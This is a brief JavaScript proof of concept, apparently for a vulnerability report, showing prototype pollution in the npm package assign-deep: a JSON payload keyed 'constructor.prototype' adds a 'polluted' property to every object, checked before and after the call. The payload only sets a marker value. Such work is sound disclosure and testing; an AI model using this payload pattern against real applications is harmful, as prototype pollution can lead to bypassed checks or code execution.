const assign = require('assign-deep');
const payloads = ['{"constructor.prototype": {"polluted":"yes"}}'];
var obj = {};
console.log({}.polluted);
assign({}, JSON.parse(payloads[0]));
console.log({}.polluted);